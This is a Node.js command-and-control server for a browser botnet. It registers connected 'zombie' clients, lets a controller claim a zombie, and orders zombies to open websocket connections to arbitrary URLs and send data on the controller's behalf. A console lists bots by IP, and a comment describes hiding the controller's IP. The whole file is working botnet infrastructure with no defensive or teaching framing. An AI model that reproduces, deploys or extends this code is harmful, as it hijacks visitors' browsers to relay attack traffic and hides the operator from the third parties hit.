const app = require('express')();
const server = require('http').createServer(app);
const readline = require('readline');
const os = require('os');
const { stdout } = require('process');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: '$ '
});
const io = require('socket.io')(server, {
    cors: {
      	origin: '*',
    }
});
const { Blob } = require('node:buffer');
const byteSize = str => new Blob([str.toString()]).size;

global.lastid = 1;

function getConsoleSize() {
    const { columns } = stdout;
    return columns;
  }
  
  function clearConsole() {
    readline.cursorTo(stdout, 0, 0);
    readline.clearScreenDown(stdout);
  }
  
  function printTable(table) {
    const terminalWidth = getConsoleSize();
    const tableWidth = Math.min(terminalWidth - 4, 60);
    const idWidth = Math.max(10, Math.floor(tableWidth / 3));
    const ipWidth = Math.max(15, Math.floor(tableWidth / 3));
    const sidWidth = Math.max(20, tableWidth - idWidth - ipWidth);
  
    console.log('Botnet zombies:');
    console.log(`┏${'━'.repeat(idWidth)}┳${'━'.repeat(ipWidth)}┳${'━'.repeat(sidWidth)}┓`);
    console.log(`┃${'ID'.padStart((idWidth + 4) / 2).padEnd(idWidth)}┃${'IP'.padStart((ipWidth + 4) / 2).padEnd(ipWidth)}┃${'SID'.padStart((sidWidth + 4) / 2).padEnd(sidWidth)}┃`);
    console.log(`┣${'━'.repeat(idWidth)}╋${'━'.repeat(ipWidth)}╋${'━'.repeat(sidWidth)}┫`);
  
    table.forEach(item => {
      const id = item.id.toString().slice(0, idWidth - 1).padEnd(idWidth);
      const ip = (item.ip || '').slice(0, ipWidth - 1).padEnd(ipWidth);
      const sid = (item.sid || '').slice(0, sidWidth - 1).padEnd(sidWidth);
      console.log(`┃${id}┃${ip}┃${sid}┃`);
    });
  
    console.log(`┗${'━'.repeat(idWidth)}┻${'━'.repeat(ipWidth)}┻${'━'.repeat(sidWidth)}┛`);
  }

function getKeyByValue(object, value) {
    for(var prop in object) {
        if(object.hasOwnProperty(prop)) {
            if(object[prop] === value)
                return prop;
        };
    };
    return false;
};

const Client = require('./Client.js');

app.get('/', (req, res) => {
    res.sendfile('./client/index.html');
});

var sockets = [];
var clients = [];

io.on('connection', (socket) => {
    sockets.push(socket);
	const client = new Client(socket);
    setTimeout(() => clients.push(client), 3000); // delay the pushing process to do not leak controller's ip

	socket.on("controller", () => { // socket is marking as a controller
		client.markedController = true;
		socket.emit("id", client.id);
		console.log(client.id + " marked as controller");
	});

	socket.on("control", (id) => { // controller asks to control some zombie
		target = clients.filter(sock => sock.id == id)[0];
		if(!target) return;
		if(target.markedController || target.controlled) return;
		target.controller = client.id;
		target.controlled = true;
		console.log(client.id + " is now controlling " + target.id);
	});

	socket.on("send", (target, data) => { // controller asks the controlled zombie to send something on zombie's websocket
		target = clients.filter(sock => sock.id == target);
		if(target.length == 0) return;
		target[0].ws.emit("send", data);
	});

	socket.on("close", (target) => {
		target = clients.filter(sock => sock.id == target)[0];
		target.ws.emit("close");
	});

	socket.on("con", (target, url, binaryType) => { // controller asks the controlled zombie to connect some ws
		target = clients.filter(sock => sock.id == target)[0];
		target.ws.emit("con", url, binaryType);
		console.log(client.id + " is connecting " + target.id + " to " + url);
	});

	socket.on("status", (status) => {
		controllers = clients.filter(sock => sock.id == client.controller);
		if(controllers.length == 0) return;
		controllers[0].ws.emit("status", client.id, status);
	});

	socket.on("message", (message) => {
		controller = clients.filter(sock => sock.id == client.controller);
		if(controller.length == 0) return;
		controller[0].ws.emit("message", client.id, message);
	});
	
    socket.on('disconnect', () => {
		if(client.markedController) {
			controlled = clients.filter(sock => sock.controller == client.id);
			controlled.forEach(zombie => {
				zombie.controller = 0;
				zombie.controlled = false;
				zombie.ws.emit("close");
			});
		};
        sockets = sockets.filter(sock => sock.id !== socket.id);
        clients = clients.filter(cli => cli.sid !== socket.id);
    });

	setInterval(() => {
		let filteredClients = clients.filter(cli => 
			cli.sid !== socket.id && 
			(cli.controller == 0 || cli.controller === client.id) &&
			!cli.markedController
		);
		
		let reducedClients = filteredClients.map(cli => {
			return {
				id: cli.id,
				ip: cli.ip,
				sid: cli.sid,
				controller: cli.controller
			};
		});
		
		socket.emit('list', reducedClients);
	}, 1000);
});

class Command {
    constructor(args, command) {
        this.args = args;
        this.command = command;
        this.execute();
    };
    execute() {
        if(typeof this[this.command] === 'function') {
            this[this.command]();
        } else {
            console.log(`Unknown command: ${this.command}`);
        };
    };
    bots() {
        printTable(clients);
    };
	cls() {
		clearConsole();	
	};
    kick() {
        if(this.args.length === 0) {
            console.log('No user specified. Please provide a numerical ID.');
        } else {
            const user = this.args[0];
            console.log(`Kicked user: ${user}`);
            
        };
    };
};

rl.prompt();

rl.on('line', (input) => {
    const [command, ...args] = input.trim().split(' ');
    new Command(args, command);
    rl.prompt();
});

server.listen(8080, () =>{
    console.log("localhost:8080");
    rl.prompt();
});